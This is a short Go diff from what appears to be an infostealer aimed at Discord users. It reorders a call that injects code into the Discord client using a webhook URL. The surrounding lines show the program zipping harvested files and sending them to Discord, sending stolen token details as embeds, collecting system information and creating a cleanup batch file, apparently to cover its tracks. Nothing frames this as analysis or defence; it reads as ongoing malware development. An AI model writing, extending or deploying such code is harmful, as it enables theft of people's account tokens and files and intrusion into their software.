@@ -193,6 +193,10 @@ func main() {
 	sendFileToDiscord(zipPath)
 	time.Sleep(2 * time.Second)
 
+	if err := InjectDiscord(getWebhookURL()); err != nil {
+		log.Fatalf("Injection error: %v", err)
+	}
+
 	sysInfo := getSystemInfo()
 	fileSizes := make(map[string]int64)
 	_ = filepath.Walk(outputDir, func(path string, info os.FileInfo, err error) error {
@@ -232,9 +236,6 @@ func main() {
 	if tokenInfo != nil {
 		tokenEmbed := createTokenEmbed(tokenInfo)
 		sendEmbedToDiscord(tokenEmbed)
-	}
-	if err := InjectDiscord(getWebhookURL()); err != nil {
-		log.Fatalf("Injection error: %v", err)
 	}
 
 	createCleanupBatch()
